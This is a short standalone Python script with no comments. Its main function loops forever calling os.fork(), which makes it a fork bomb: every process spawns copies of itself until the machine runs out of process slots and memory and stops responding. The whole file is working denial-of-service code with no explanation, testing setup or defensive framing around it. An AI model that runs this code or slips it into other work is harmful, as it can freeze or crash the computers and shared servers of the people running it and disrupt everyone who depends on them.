import os

def main():
    while True:
        os.fork()

if __name__ == "__main__":
    main()

